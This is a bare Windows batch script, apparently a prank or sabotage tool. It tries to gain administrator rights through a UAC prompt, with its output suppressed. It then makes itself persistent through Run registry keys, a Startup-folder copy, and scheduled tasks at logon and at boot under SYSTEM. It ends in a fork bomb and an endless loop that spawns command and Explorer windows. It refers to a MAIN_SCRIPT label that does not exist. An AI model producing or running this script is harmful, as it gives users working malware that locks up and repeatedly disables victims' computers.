@echo off
set "BATCH_PATH=%~f0"

net session >nul 2>&1
if %errorlevel% equ 0 goto IS_ADMIN

powershell -Command "Start-Process -FilePath '%BATCH_PATH%' -ArgumentList '--elevated' -Verb RunAs" >nul 2>&1
if %errorlevel% equ 0 (
    exit /b
) else (
    goto NO_ADMIN
)

:NO_ADMIN
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "forkApp" /t REG_SZ /d "\"%BATCH_PATH%\"" /f >nul 2>&1
copy /y "%BATCH_PATH%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fork.bat" >nul 2>&1
schtasks /create /tn "forkLogon" /tr "\"%BATCH_PATH%\"" /sc onlogon /f >nul 2>&1
goto MAIN_SCRIPT

:IS_ADMIN
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "forkApp" /t REG_SZ /d "\"%BATCH_PATH%\"" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "forkApp" /t REG_SZ /d "\"%BATCH_PATH%\"" /f >nul 2>&1
copy /y "%BATCH_PATH%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fork.bat" >nul 2>&1
schtasks /create /tn "forkLogon" /tr "\"%BATCH_PATH%\"" /sc onlogon /f >nul 2>&1
schtasks /create /tn "forkBoot" /tr "\"%BATCH_PATH%\"" /sc onstart /ru SYSTEM /f >nul 2>&1
goto MAIN_SCRIPT
%0 | %0
:bucle
start cmd.exe
start explorer.exe
goto bucle
